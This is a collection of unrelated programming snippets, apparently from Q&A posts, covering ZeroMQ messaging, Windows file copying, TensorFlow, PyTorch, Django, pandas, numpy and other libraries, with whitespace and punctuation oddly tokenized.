"# subscriber.pyimport zmqdef main ( ) : ctx = zmq.Context.instance ( ) sub = ctx.socket ( zmq.SUB ) sub.connect ( `` tcp : //127.0.0.1:5558 '' ) # Subscribe to every single topic from publisher print 'subscribing ( sub side ) ' sub.setsockopt ( zmq.SUBSCRIBE , b '' my-topic '' ) poller = zmq.Poller ( ) poller.register ( sub , zmq.POLLIN ) while True : try : events = dict ( poller.poll ( 1000 ) ) except KeyboardInterrupt : print ( `` interrupted '' ) break # Any new topic data we cache and then forward if sub in events : msg = sub.recv_multipart ( ) topic , current = msg print 'received % s on topic % s ' % ( current , topic ) if __name__ == '__main__ ' : main ( ) # broker.py # from http : //zguide.zeromq.org/py : lvcacheimport zmqimport threadingimport timeclass Publisher ( threading.Thread ) : def __init__ ( self ) : super ( Publisher , self ) .__init__ ( ) def run ( self ) : time.sleep ( 10 ) ctx = zmq.Context.instance ( ) pub = ctx.socket ( zmq.PUB ) pub.connect ( `` tcp : //127.0.0.1:5557 '' ) cnt = 0 while True : msg = 'hello % d ' % cnt print 'publisher is publishing % s ' % msg pub.send_multipart ( [ 'my-topic ' , msg ] ) cnt += 1 time.sleep ( 5 ) def main ( ) : ctx = zmq.Context.instance ( ) frontend = ctx.socket ( zmq.SUB ) frontend.bind ( `` tcp : //*:5557 '' ) backend = ctx.socket ( zmq.XPUB ) backend.bind ( `` tcp : //*:5558 '' ) # Subscribe to every single topic from publisher frontend.setsockopt ( zmq.SUBSCRIBE , b '' '' ) # Store last instance of each topic in a cache cache = { } # We route topic updates from frontend to backend , and # we handle subscriptions by sending whatever we cached , # if anything : poller = zmq.Poller ( ) poller.register ( frontend , zmq.POLLIN ) poller.register ( backend , zmq.POLLIN ) # launch a publisher p = Publisher ( ) p.daemon = True p.start ( ) while True : try : events = dict ( poller.poll ( 1000 ) ) except KeyboardInterrupt : print ( `` interrupted '' ) break # Any new topic data we cache and then forward if frontend in events : msg = frontend.recv_multipart ( ) topic , current = msg cache [ topic ] = current backend.send_multipart ( msg ) # # # this is where it fails for the 2nd subscriber . # # # There 's never even an event from the backend # # # in events when the 2nd subscriber is subscribing . # When we get a new subscription we pull data from the cache : if backend in events : print 'message from subscriber ' event = backend.recv ( ) # Event is one byte 0=unsub or 1=sub , followed by topic if event [ 0 ] == b'\x01 ' : topic = event [ 1 : ] print ' = > subscribe to % s ' % topic if topic in cache : print ( `` Sending cached topic % s '' % topic ) backend.send_multipart ( [ topic , cache [ topic ] ] ) elif event [ 0 ] == b'\x00 ' : topic = event [ 1 : ] print ' = > unsubscribe from % s ' % topicif __name__ == '__main__ ' : main ( ) Python 2.7.9 ( v2.7.9:648dcafa7e5f , Dec 10 2014 , 10:10:46 ) [ GCC 4.2.1 ( Apple Inc. build 5666 ) ( dot 3 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import zmq > > > zmq.__version__'14.1.1 ' $ brew info zeromqzeromq : stable 4.0.5 ( bottled ) , HEADHigh-performance , asynchronous messaging libraryhttp : //www.zeromq.org//usr/local/Cellar/zeromq/4.0.5_2 ( 64 files , 2.8M ) * Poured from bottleFrom : https : //github.com/Homebrew/homebrew/blob/master/Library/Formula/zeromq.rb== > DependenciesBuild : pkg-config ✔Optional : libpgm ✘ , libsodium ✘ 0000 02 00 00 00 45 00 00 3f 98 be 40 00 40 06 00 00 ... .E.. ? .. @ . @ ... 0010 7f 00 00 01 7f 00 00 01 fa e5 15 b6 34 f0 51 c3 ... ... .. ... .4.Q.0020 05 e4 8b 77 80 18 31 d4 fe 33 00 00 01 01 08 0a ... w..1 . .3 ... ... 0030 2a aa d1 d2 2a aa cd e9 00 09 01 6d 79 2d 74 6f * ... * ... ... my-to0040 70 69 63 pic identification v0000 02 00 00 00 45 00 00 3f ed be 40 00 40 06 00 00 ... .E.. ? .. @ . @ ... src port sequence number v v v v v0010 7f 00 00 01 7f 00 00 01 fa e6 15 b6 17 da 02 e7 ... ... .. ... ... ..Acknowledgement number window scaling factor v v v v v0020 71 4b 33 e6 80 18 31 d5 fe 33 00 00 01 01 08 0a qK3 ... 1 . .3 ... ... timestamp value timestamp echo reply v v v | < -- -- -- -- data -- -- -- -0030 2a aa f8 2c 2a aa f4 45 00 09 01 6d 79 2d 74 6f *.. , *..E ... my-to -- -- -- > |0040 70 69 63 pic"
"test_file_size 1082.1 MiB 10216.7 MiBMETHOD SPEED SPEEDrobocopy.exe 111.0 MiB/s 75.4 MiB/scmd.exe /c copy 95.5 MiB/s 60.5 MiB/sshutil.copyfile 51.0 MiB/s 29.4 MiB/swin32api.CopyFile 104.8 MiB/s 74.2 MiB/swin32file.CopyFile 108.2 MiB/s 73.4 MiB/swin32file.CopyFileEx A 14.0 MiB/s 13.8 MiB/swin32file.CopyFileEx B 14.6 MiB/s 14.9 MiB/s Python : ActivePython 2.7.0.2 ( ActiveState Software Inc. ) based onPython 2.7 ( r27:82500 , Aug 23 2010 , 17:17:51 ) [ MSC v.1500 64 bit ( AMD64 ) ] on win32source = mounted network drivesource_os = Windows Server 2008 x64destination = local drivedestination_os = Windows Server 2008 R2 x64 'robocopy.exe ' and 'cmd.exe /c copy ' were run using subprocess.call ( ) def Win32_CopyFileEx_NoProgress ( ExistingFileName , NewFileName ) : win32file.CopyFileEx ( ExistingFileName , # PyUNICODE | File to be copied NewFileName , # PyUNICODE | Place to which it will be copied None , # CopyProgressRoutine | A python function that receives progress updates , can be None Data = None , # object | An arbitrary object to be passed to the callback function Cancel = False , # boolean | Pass True to cancel a restartable copy that was previously interrupted CopyFlags = win32file.COPY_FILE_RESTARTABLE , # int | Combination of COPY_FILE_* flags Transaction = None # PyHANDLE | Handle to a transaction as returned by win32transaction : :CreateTransaction ) def Win32_CopyFileEx ( ExistingFileName , NewFileName ) : win32file.CopyFileEx ( ExistingFileName , # PyUNICODE | File to be copied NewFileName , # PyUNICODE | Place to which it will be copied Win32_CopyFileEx_ProgressRoutine , # CopyProgressRoutine | A python function that receives progress updates , can be None Data = None , # object | An arbitrary object to be passed to the callback function Cancel = False , # boolean | Pass True to cancel a restartable copy that was previously interrupted CopyFlags = win32file.COPY_FILE_RESTARTABLE , # int | Combination of COPY_FILE_* flags Transaction = None # PyHANDLE | Handle to a transaction as returned by win32transaction : :CreateTransaction ) def Win32_CopyFileEx_ProgressRoutine ( TotalFileSize , TotalBytesTransferred , StreamSize , StreamBytesTransferred , StreamNumber , CallbackReason , # CALLBACK_CHUNK_FINISHED or CALLBACK_STREAM_SWITCH SourceFile , DestinationFile , Data ) : # Description return win32file.PROGRESS_CONTINUE # return of any win32file.PROGRESS_* constant"
"from matplotlib import rcParamsfrom matplotlib import pyplot as pltrcParams [ 'figure.figsize ' ] = 15 , 9 % matplotlib inline"
"lstm_cell = tf.nn.rnn_cell.LSTMCell ( num_lstm_units , input_size ) lstm_outputs , state = tf.nn.rnn ( lstm_cell , input_list , dtype=tf.float32 , sequence_length=sequence_lengths ) all_outputs = tf.pack ( lstm_outputs ) last_outputs = all_outputs [ sequence_lengths , tf.range ( batch_size ) , : ]"
"import torchimport torch.nn as nnclass MyNet ( torch.nn.Module ) : def __init__ ( self ) : super ( MyNet , self ) .__init__ ( ) self.layer = nn.Linear ( 10 , 10 ) self.parameter = torch.nn.Parameter ( torch.zeros ( 10,10 , requires_grad=True ) ) net = MyNet ( ) print ( net ) MyNet ( ( layer ) : Linear ( in_features=10 , out_features=10 , bias=True ) )"
"import matplotlib.pyplot as pltimport numpy as npimport plotly.graph_objs as goimport plotly.offline as offoff.init_notebook_mode ( ) make_int = np.vectorize ( int ) cmap = plt.get_cmap ( `` tab10 '' ) saddle = np.array ( [ [ x**2-y**2 for x in np.arange ( -10,11 ) ] for y in np.arange ( -10,11 ) ] ) paraboloid = np.array ( [ [ x**2 + y**2-100 for x in np.arange ( -10,11 ) ] for y in np.arange ( -10,11 ) ] ) mycolors_a = make_int ( 256*np.array ( cmap ( 1 ) [ 0:3 ] ) ) .reshape ( ( 1 , 1 , -1 ) ) .repeat ( 21 , axis = 0 ) .repeat ( 21 , axis =1 ) mycolors_b = make_int ( 256*np.array ( cmap ( 2 ) [ 0:3 ] ) ) .reshape ( ( 1 , 1 , -1 ) ) .repeat ( 21 , axis = 0 ) .repeat ( 21 , axis =1 ) trace_a = go.Surface ( z = saddle , surfacecolor = mycolors_a , opacity = .7 , showscale = False , name = `` Trace A '' ) trace_b = go.Surface ( z = paraboloid , surfacecolor = mycolors_b , opacity = .7 , showscale = False , name = `` Trace B '' ) data = [ trace_a , trace_b ] off.iplot ( data )"
"for i in range ( 1 , 10 ) : print i i = i + 3 123456789 147"
"class Badge ( TimeStampable , Expirable , Deactivable , SafeDeleteModel ) : _safedelete_policy = HARD_DELETE owner = models.ForeignKey ( settings.AUTH_USER_MODEL , blank=True , null=True , on_delete=models.PROTECT ) restaurants = models.ManyToManyField ( Restaurant ) identifier = models.CharField ( max_length=2048 ) objects = SafeDeleteManager.from_queryset ( BadgeQuerySet ) ( ) from django.db.models.signals import m2m_changedfrom django.dispatch import receiverfrom .models import Badge @ receiver ( m2m_changed , sender=Badge.restaurants.through ) def my_callback ( sender , **kwargs ) : print ( `` M2M has been changed ! '' ) from django.apps import AppConfigclass BadgesConfig ( AppConfig ) : name = 'badges ' def ready ( self ) : import badges.signals In [ 1 ] : from django.db.models.signals import m2m_changedIn [ 2 ] : m2m_changed.receiversOut [ 2 ] : [ ] In [ 3 ] : import badges.signalsIn [ 4 ] : m2m_changed.receiversOut [ 4 ] : [ ( ( 4551224720 , 4520068792 ) , < weakref at 0x10f4da5e8 ; to 'function ' at 0x10f462d90 ( check_uniqueness ) > ) ]"
"# 'data ' is bytes and 'mask ' is intbmask = struct.pack ( ' ! I ' , mask ) # converting the `` int '' mask to `` bytes '' of 4 bytes a = bytes ( b ^ m for b , m in zip ( data , itertools.cycle ( bmask ) ) ) # 'data ' is bytes and 'mask ' is int # reversing the bytes of the maskbmask = struct.pack ( `` < I '' , mask ) mask = struct.unpack ( `` > I '' , bmask ) [ 0 ] # converting from bytes to array of `` int '' sarr = array.array ( `` I '' , data ) # looping over the `` int '' sfor i in range ( len ( arr ) ) : arr [ i ] ^= mask # must return bytesa = bytes ( arr )"
"def boom ( x , y ) : try : x / y except Exception as e : import ipdb ; ipdb.set_trace ( ) def main ( ) : x = 2 y = 0 boom ( x , y ) if __name__ == '__main__ ' : main ( ) $ python crash.py > /tmp/crash.py ( 6 ) boom ( ) 5 except Exception as e : -- -- > 6 import ipdb ; ipdb.set_trace ( ) 7 ipdb > u > /tmp/crash.py ( 11 ) main ( ) 10 y = 0 -- - > 11 boom ( x , y ) 12 ipdb > p y0 def boom ( x , y ) : x / ydef main ( ) : x = 2 y = 0 boom ( x , y ) if __name__ == '__main__ ' : try : main ( ) except Exception as e : import ipdb ; ipdb.set_trace ( ) $ python crash.py > /tmp/crash.py ( 14 ) < module > ( ) 12 main ( ) 13 except Exception as e : -- - > 14 import ipdb ; ipdb.set_trace ( ) ipdb > ! import traceback ; traceback.print_exc ( e ) Traceback ( most recent call last ) : File `` crash.py '' , line 12 , in < module > main ( ) File `` crash.py '' , line 8 , in main boom ( x , y ) File `` crash.py '' , line 3 , in boom x / yZeroDivisionError : integer division or modulo by zeroipdb > d # I want to see what value x and y had ! *** Newest frame"
"def sorted ( services ) : return { sorted } ( services , key=lambda s : s.sortkey ( ) )"
"import sysfrom PyQt5.QtCore import pyqtSlotfrom PyQt5.QtWidgets import QApplicationfrom PyQt5.QtWebChannel import QWebChannelfrom PyQt5.QtWebEngineWidgets import QWebEngineView , QWebEnginePagehtml = `` ' < ! DOCTYPE html > < html > < head > < meta charset= '' utf-8 '' / > < script src= '' qrc : ///qtwebchannel/qwebchannel.js '' > < /script > < script > var backend ; new QWebChannel ( qt.webChannelTransport , function ( channel ) { backend = channel.objects.backend ; } ) ; document.getElementById ( `` header '' ) .addEventListener ( `` click '' , function ( ) { backend.foo ( ) ; } ) ; < /script > < /head > < body > < h2 id= '' header '' > Header. < /h2 > < /body > < /html > ' '' class HelloWorldHtmlApp ( QWebEngineView ) : def __init__ ( self ) : super ( ) .__init__ ( ) # setup a page with my html my_page = QWebEnginePage ( self ) my_page.setHtml ( html ) self.setPage ( my_page ) # setup channel self.channel = QWebChannel ( ) self.channel.registerObject ( 'backend ' , self ) self.page ( ) .setWebChannel ( self.channel ) self.show ( ) @ pyqtSlot ( ) def foo ( self ) : print ( 'bar ' ) if __name__ == `` __main__ '' : app = QApplication.instance ( ) or QApplication ( sys.argv ) view = HelloWorldHtmlApp ( ) view.show ( ) app.exec_ ( )"
"from bisect import bisect_leftdef index ( lst , target ) : `` '' '' If target is in list , returns the index of target ; otherwise returns None '' '' '' i = bisect_left ( lst , target ) if i ! = len ( lst ) and lst [ i ] == target : return i else : return Nonedef interlock ( str1 , str2 ) : `` Takes two strings of equal length and 'interlocks ' them . '' if len ( str1 ) == len ( str2 ) : lst1 = list ( str1 ) lst2 = list ( str2 ) result = [ ] for i in range ( len ( lst1 ) ) : result.append ( lst1 [ i ] ) result.append ( lst2 [ i ] ) return `` .join ( result ) else : return Nonedef interlockings ( word_lst ) : `` '' '' Checks each pair of equal-length words to see if their interlocking is a word ; prints each successful pair and the total number of successful pairs . '' '' '' total = 0 for i in range ( 1 , 12 ) : # 12 because max word length is 22 # to shorten the loops , get a sublist of words of equal length sub_lst = filter ( lambda ( x ) : len ( x ) == i , word_lst ) for word1 in sub_lst [ : -1 ] : for word2 in sub_lst [ sub_lst.index ( word1 ) +1 : ] : # pair word1 only with words that come after word1 word1word2 = interlock ( word1 , word2 ) # interlock word1 with word2 word2word1 = interlock ( word2 , word1 ) # interlock word2 with word1 if index ( lst , word1word2 ) : # check to see if word1word2 is actually a word total += 1 print `` Word 1 : % s , Word 2 : % s , Interlock : % s '' % ( word1 , word2 , word1word2 ) if index ( lst , word2word1 ) : # check to see if word2word1 is actually a word total += 1 print `` Word 2 , % s , Word 1 : % s , Interlock : % s '' % ( word2 , word1 , word2word1 ) print `` Total interlockings : `` , total"
"from __future__ import print_functionfrom OCC.gp import gp_Pnt , gp_Ax2 , gp_Dir , gp_Circfrom OCC.GeomAPI import GeomAPI_PointsToBSplinefrom OCC.TColgp import TColgp_Array1OfPntfrom OCC.BRepBuilderAPI import BRepBuilderAPI_MakeEdge , BRepBuilderAPI_MakeWire , BRepBuilderAPI_MakeFacefrom OCC.BRepOffsetAPI import BRepOffsetAPI_MakePipefrom OCC.Display.SimpleGui import init_displaydisplay , start_display , add_menu , add_function_to_menu = init_display ( ) def pipe ( ) : # the bspline path , must be a wire # This will later be in a for loop but this is merely to validate the method using three different points.array = TColgp_Array1OfPnt ( 1,2 ) makeWire = BRepBuilderAPI_MakeWire ( ) point1 = gp_Pnt ( 0,0,0 ) point2 = gp_Pnt ( 0,0,1 ) array.SetValue ( 1 , point1 ) array.SetValue ( 2 , point2 ) spline = GeomAPI_PointsToBSpline ( array ) .Curve ( ) edge = BRepBuilderAPI_MakeEdge ( spline ) .Edge ( ) makeWire.Add ( edge ) point1 = gp_Pnt ( 0 , 0 , 1 ) point2 = gp_Pnt ( 0 , 1 , 2 ) array.SetValue ( 1 , point1 ) array.SetValue ( 2 , point2 ) spline = GeomAPI_PointsToBSpline ( array ) .Curve ( ) edge = BRepBuilderAPI_MakeEdge ( spline ) .Edge ( ) makeWire.Add ( edge ) point1 = gp_Pnt ( 0 , 1 , 2 ) point2 = gp_Pnt ( 0 , 2 , 2 ) array.SetValue ( 1 , point1 ) array.SetValue ( 2 , point2 ) spline = GeomAPI_PointsToBSpline ( array ) .Curve ( ) edge = BRepBuilderAPI_MakeEdge ( spline ) .Edge ( ) makeWire.Add ( edge ) makeWire.Build ( ) wire = makeWire.Wire ( ) # the bspline profile . Profile mist be a wire/facepoint = gp_Pnt ( 0,0,0 ) dir = gp_Dir ( 0,0,1 ) circle = gp_Circ ( gp_Ax2 ( point , dir ) , 0.2 ) profile_edge = BRepBuilderAPI_MakeEdge ( circle ) .Edge ( ) profile_wire = BRepBuilderAPI_MakeWire ( profile_edge ) .Wire ( ) profile_face = BRepBuilderAPI_MakeFace ( profile_wire ) .Face ( ) # pipepipe = BRepOffsetAPI_MakePipe ( wire , profile_face ) .Shape ( ) display.DisplayShape ( profile_edge , update=False ) display.DisplayShape ( wire , update=True ) display.DisplayShape ( pipe , update=True ) if __name__ == '__main__ ' : pipe ( ) start_display ( )"
"class Item ( Base ) : __tablename__ = 'item ' id = Column ( Integer , primary_key=True ) notes = relationship ( `` Note '' , collection_class=attribute_mapped_collection ( 'keyword ' ) , cascade= '' all , delete-orphan '' ) class Note ( Base ) : __tablename__ = 'note ' id = Column ( Integer , primary_key=True ) item_id = Column ( Integer , ForeignKey ( 'item.id ' ) , nullable=False ) keyword = Column ( String ) text = Column ( String ) | Note table || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- || id | keyword || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- || 1 | foo || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- || 2 | foo || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- || 3 | bar || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- || 4 | bar || -- -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- -- | { 'foo ' : < project.models.note.Note at 0x7fc6840fadd2 > , 'bar ' : < project.models.note.Note at 0x7fc6840fadd4 > } { 'foo ' : [ < project.models.note.Note at 0x7fc6840fadd1 , < project.models.note.Note at 0x7fc6840fadd2 > ] , 'bar ' : [ < project.models.note.Note at 0x7fc6840fadd3 > , < project.models.note.Note at 0x7fc6840fadd4 > ] }"
class Hello { int x = 0 ; void ex ( ) { x = 7 ; } public static void main ( String args [ ] ) { Hello h = new Hello ( ) ; System.out.println ( h.x ) ; h.ex ( ) ; System.out.println ( h.x ) ; } } class Hello : def __init__ ( self ) : self.x = 0 def ex ( self ) : self.x = 7h = Hello ( ) print ( h.x ) h.ex ( ) print ( h.x ) 07
"def deletiondistance ( firstword , secondword ) : dfw = { } dsw = { } diff = 0for i in range ( len ( firstword ) ) : print firstword [ i ] if firstword [ i ] in dfw : dfw [ firstword [ i ] ] +=1 else : dfw [ firstword [ i ] ] =1for j in range ( len ( secondword ) ) : if secondword [ j ] in dsw : dsw [ secondword [ j ] ] +=1 else : dsw [ secondword [ j ] ] =1for key , value in dfw.iteritems ( ) : if key in dsw : # print `` key exists '' pass else : diff +=1print `` diff '' , diff"
"next = driver.find_element_by_css_selector ( `` .next '' ) next.click ( ) < li class= '' previous '' > # button < /li > < li class= '' next '' > # button < /li > < li class= '' previous '' > < a class= '' next '' rel= '' nofollow '' onclick= '' qc.pA ( 'nrForm ' , 'f76 ' , 'QClickEvent ' , ' 1 ' , 'f28 ' ) ; return false ; '' href= '' '' > Previous < /a > < /li > < li class= '' next '' > < a class= '' next '' rel= '' nofollow '' onclick= '' qc.pA ( 'nrForm ' , 'f76 ' , 'QClickEvent ' , ' 3 ' , 'f28 ' ) ; return false ; '' href= '' '' > Next < /a > < /li >"
"class Shape : def __init__ ( self , * , shapename , **kwds ) : self.shapename = shapename super ( ) .__init__ ( **kwds )"
"In [ 167 ] : tsOut [ 168 ] : last last_sz bid askdatetime 2016-08-23 00:00:14.161128 2170.75 1 2170.75 2171.002016-08-23 00:00:14.901180 2171.00 1 2170.75 2171.002016-08-23 00:00:17.196639 2170.75 1 2170.75 2171.002016-08-23 00:00:17.664193 2171.00 1 2170.75 2171.002016-08-23 00:00:17.664193 2171.00 1 2170.75 2171.002016-08-23 00:00:17.664193 2171.00 2 2170.75 2171.002016-08-23 00:00:17.664193 2171.00 1 2170.75 2171.002016-08-23 00:00:26.206108 2170.75 2 2170.75 2171.002016-08-23 00:00:28.322456 2170.75 7 2170.75 2171.002016-08-23 00:00:28.322456 2170.75 1 2170.75 2171.00 In [ 169 ] : make_timestamps_unique ( ts ) Out [ 170 ] : last last_sz bid asknewindex 2016-08-23 00:00:14.161128000 2170.75 1 2170.75 2171.02016-08-23 00:00:14.901180000 2171.00 1 2170.75 2171.02016-08-23 00:00:17.196639000 2170.75 1 2170.75 2171.02016-08-23 00:00:17.664193000 2171.00 1 2170.75 2171.02016-08-23 00:00:17.664193001 2171.00 1 2170.75 2171.02016-08-23 00:00:17.664193002 2171.00 2 2170.75 2171.02016-08-23 00:00:17.664193003 2171.00 1 2170.75 2171.02016-08-23 00:00:26.206108000 2170.75 2 2170.75 2171.02016-08-23 00:00:28.322456000 2170.75 7 2170.75 2171.02016-08-23 00:00:28.322456001 2170.75 1 2170.75 2171.0 def make_timestamps_unique ( ts ) : mask = ts.index.duplicated ( 'first ' ) duplicate_count = np.sum ( mask ) passes = 0 while duplicate_count > 0 : ts.loc [ : , 'newindex ' ] = ts.index ts.loc [ mask , 'newindex ' ] += pd.Timedelta ( '1ns ' ) ts = ts.set_index ( 'newindex ' ) mask = ts.index.duplicated ( 'first ' ) duplicate_count = np.sum ( mask ) passes += 1 print ( ' % d passes of duplication loop ' % passes ) return ts"
"SUBROUTINE average ( a , b , out ) real a , b , outcf2py intent ( in ) a , bcf2py intent ( out ) out call add ( a , b , out ) out=out/2 END subroutine add ( a , b , out ) real a , b , out out = a + b return end"
"x = pd.DataFrame ( { 'cat ' : [ ' A ' , ' A ' , ' B ' ] , 'val ' : [ 10,20,30 ] } ) x = x.set_index ( 'cat ' ) valcat A 10A 20B 30 valcat 1 101 202 30 cat val0 1 101 1 202 2 30"
"import numpy as npdef distance ( pt_1 , pt_2 ) : pt_1 = np.array ( ( pt_1 [ 0 ] , pt_1 [ 1 ] ) ) pt_2 = np.array ( ( pt_2 [ 0 ] , pt_2 [ 1 ] ) ) return np.linalg.norm ( pt_1-pt_2 ) def closest_node ( node , nodes ) : nodes = np.asarray ( nodes ) dist_2 = np.sum ( ( nodes - node ) **2 , axis=1 ) return np.argmin ( dist_2 ) a = [ ] for x in range ( 50000 ) : a.append ( ( np.random.randint ( 0,1000 ) , np.random.randint ( 0,1000 ) ) ) some_pt = ( 1 , 2 ) closest_node ( some_pt , a ) array ( [ [ 2.08937872e+001 , 1.99020033e+001 , 2.28260611e+001 , 6.27711094e+000 , 3.30392288e+000 , 1.30312878e+001 , 8.80768833e+000 , 1.31238275e+001 , 1.57400130e+001 , 5.00278061e+000 , 1.70752624e+001 , 1.79131456e+001 , 1.50746185e+001 , 2.50095731e+001 , 2.15895974e+001 , 1.23237801e+001 , 1.14860312e+001 , 1.44268222e+001 , 6.37680265e+000 , 7.81485403e+000 ] , [ -1.19702178e-001 , -1.14050879e-001 , -1.29711421e-001 , 8.32977493e-001 , 7.27437322e-001 , 8.94389885e-001 , 8.65931116e-001 , -6.08199292e-002 , -8.51922900e-002 , 1.12333841e-001 , -9.88131292e-324 , 4.94065646e-324 , -9.88131292e-324 , 4.94065646e-324 , 4.94065646e-324 , 0.00000000e+000 , 0.00000000e+000 , 0.00000000e+000 , -4.94065646e-324 , 0.00000000e+000 ] ] )"
"dy [ i ] /dt = w [ i ] + K/N * \sum { j=1toN } sin ( y [ j ] -y [ i ] ) , where i = 1,2,3,4 ... N=50 from numpy import random , sin , arange , pi , array , zerosimport PyDDE.pydde as pdef odegrad ( s , c , t ) : global N K = c [ 0 ] theta = s [ 0 ] w = random.standard_cauchy ( N ) for i in range ( N ) : coup_sum = 0.0 for j in range ( N ) : coup_sum += sin ( theta [ j ] - theta [ i ] ) theta [ i ] = w [ i ] + ( K*coup_sum ) / ( float ( N ) ) return array ( [ theta ] ) # constant parametersglobal NN = 50K = 1.0 # initial values for state thetatheta0 = zeros ( N , float ) for i in range ( N ) : theta0 [ i ] = random.uniform ( 0 , 2*pi ) odecons = array ( [ K ] ) odeist = array ( [ theta0 ] ) odestsc = array ( [ 0.0 ] ) ode_eg = p.dde ( ) ode_eg.dde ( y=odeist , times=arange ( 0.0 , 300.0 , 1.0 ) , func=odegrad , parms=odecons , tol=0.000005 , dt=1.0 , hbsize=0 , nlag=0 , ssc=odestsc ) ode_eg.solve ( ) print ode_eg.data"
"import numpy as npfrom scipy import signalimport matplotlib.pyplot as plt # # sample datat = np.linspace ( 0 , 10 * np.pi , 100 ) x = np.sin ( t ) fig , ax = plt.subplots ( ) ax.plot ( t , x , color= ' b ' , marker= ' o ' ) ax.grid ( color= ' k ' , alpha=0.3 , linestyle= ' : ' ) plt.show ( ) plt.close ( fig ) result = np.correlate ( x , x , mode='full ' ) print ( `` \n autocorrelation ( shape= { } ) : \n { } \n '' .format ( result.shape , result ) ) autocorrelation ( shape= ( 199 , ) ) : [ 0.00000000e+00 -3.82130761e-16 -9.73648712e-02 -3.70014208e-01 -8.59889695e-01 -1.56185995e+00 -2.41986054e+00 -3.33109112e+00 -4.15799070e+00 -4.74662427e+00 -4.94918053e+00 -4.64762251e+00 -3.77524157e+00 -2.33298717e+00 -3.97976240e-01 1.87752669e+00 4.27722402e+00 6.54129270e+00 8.39434617e+00 9.57785701e+00 9.88331103e+00 9.18204933e+00 7.44791758e+00 4.76948221e+00 1.34963425e+00 -2.50822289e+00 -6.42666652e+00 -9.99116299e+00 -1.27937834e+01 -1.44791297e+01 -1.47873668e+01 -1.35893098e+01 -1.09091510e+01 -6.93157447e+00 -1.99159756e+00 3.45267493e+00 8.86228186e+00 1.36707567e+01 1.73433176e+01 1.94357232e+01 1.96463736e+01 1.78556800e+01 1.41478477e+01 8.81191526e+00 2.32100171e+00 -4.70897483e+00 -1.15775811e+01 -1.75696560e+01 -2.20296487e+01 -2.44327920e+01 -2.44454330e+01 -2.19677060e+01 -1.71533510e+01 -1.04037163e+01 -2.33560966e+00 6.27458308e+00 1.45655029e+01 2.16769872e+01 2.68391837e+01 2.94553896e+01 2.91697473e+01 2.59122266e+01 1.99154591e+01 1.17007613e+01 2.03381596e+00 -8.14633251e+00 -1.78184255e+01 -2.59814393e+01 -3.17580589e+01 -3.44884934e+01 -3.38046447e+01 -2.96763956e+01 -2.24244433e+01 -1.26974172e+01 -1.41464998e+00 1.03204331e+01 2.13281784e+01 3.04712823e+01 3.67721634e+01 3.95170295e+01 3.83356037e+01 3.32477037e+01 2.46710643e+01 1.33886439e+01 4.77778141e-01 -1.27924775e+01 -2.50860560e+01 -3.51343866e+01 -4.18671622e+01 -4.45258983e+01 -4.27482779e+01 -3.66140001e+01 -2.66465884e+01 -1.37700036e+01 7.76494745e-01 1.55574483e+01 2.90828312e+01 3.99582426e+01 4.70285203e+01 4.95000000e+01 4.70285203e+01 3.99582426e+01 2.90828312e+01 1.55574483e+01 7.76494745e-01 -1.37700036e+01 -2.66465884e+01 -3.66140001e+01 -4.27482779e+01 -4.45258983e+01 -4.18671622e+01 -3.51343866e+01 -2.50860560e+01 -1.27924775e+01 4.77778141e-01 1.33886439e+01 2.46710643e+01 3.32477037e+01 3.83356037e+01 3.95170295e+01 3.67721634e+01 3.04712823e+01 2.13281784e+01 1.03204331e+01 -1.41464998e+00 -1.26974172e+01 -2.24244433e+01 -2.96763956e+01 -3.38046447e+01 -3.44884934e+01 -3.17580589e+01 -2.59814393e+01 -1.78184255e+01 -8.14633251e+00 2.03381596e+00 1.17007613e+01 1.99154591e+01 2.59122266e+01 2.91697473e+01 2.94553896e+01 2.68391837e+01 2.16769872e+01 1.45655029e+01 6.27458308e+00 -2.33560966e+00 -1.04037163e+01 -1.71533510e+01 -2.19677060e+01 -2.44454330e+01 -2.44327920e+01 -2.20296487e+01 -1.75696560e+01 -1.15775811e+01 -4.70897483e+00 2.32100171e+00 8.81191526e+00 1.41478477e+01 1.78556800e+01 1.96463736e+01 1.94357232e+01 1.73433176e+01 1.36707567e+01 8.86228186e+00 3.45267493e+00 -1.99159756e+00 -6.93157447e+00 -1.09091510e+01 -1.35893098e+01 -1.47873668e+01 -1.44791297e+01 -1.27937834e+01 -9.99116299e+00 -6.42666652e+00 -2.50822289e+00 1.34963425e+00 4.76948221e+00 7.44791758e+00 9.18204933e+00 9.88331103e+00 9.57785701e+00 8.39434617e+00 6.54129270e+00 4.27722402e+00 1.87752669e+00 -3.97976240e-01 -2.33298717e+00 -3.77524157e+00 -4.64762251e+00 -4.94918053e+00 -4.74662427e+00 -4.15799070e+00 -3.33109112e+00 -2.41986054e+00 -1.56185995e+00 -8.59889695e-01 -3.70014208e-01 -9.73648712e-02 -3.82130761e-16 0.00000000e+00 ] omega = np.fft.fft ( x ) freq = np.fft.fftfreq ( x.size , 1 ) threshold = 0idx = np.where ( abs ( omega ) > threshold ) [ 0 ] [ -1 ] max_f = abs ( freq [ idx ] ) print ( max_f ) freq , pdensity = signal.periodogram ( x ) fig , ax = plt.subplots ( ) ax.plot ( freq , pdensity , color= ' r ' ) ax.grid ( color= ' k ' , alpha=0.3 , linestyle= ' : ' ) plt.show ( ) plt.close ( fig )"
